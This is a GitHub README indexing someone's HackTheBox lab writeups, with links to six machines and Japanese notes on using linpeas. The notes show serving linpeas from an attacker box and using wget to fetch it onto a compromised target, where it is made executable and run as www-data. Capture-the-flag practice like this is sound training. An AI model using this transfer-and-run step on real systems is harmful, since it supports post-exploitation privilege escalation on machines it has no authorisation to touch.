# HackTheBox-writeup
HTB machines writeup


## Instant

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Instant


## Cap

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Cap


## Strutted

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Strutted


## Cicada

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Cicada


## PermX

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/PermX


## Mirai

https://github.com/s1f102201672/HackTheBox-writeup/tree/main/Mirai




# Tools
## linpeas
home/kaliにインストール

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

/home/kali送る側
```
python3 -m http.server 8080
```

ターゲットマシンで受け取る
```
cd /tmp
wget http://10.10.xx.xx/linpeas.sh -O linpeas.sh
--2025-04-08 07:42:59--  http://10.10.xx.xx/linpeas.sh
Connecting to 10.10.14.32:80... failed: Connection refused.

xx:/tmp$ ls
linpeas.sh

xx:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh

./linpeas.sh
www-data@boardlight:/tmp$ ./linpeas.sh | tee linpeas_output.txt
```
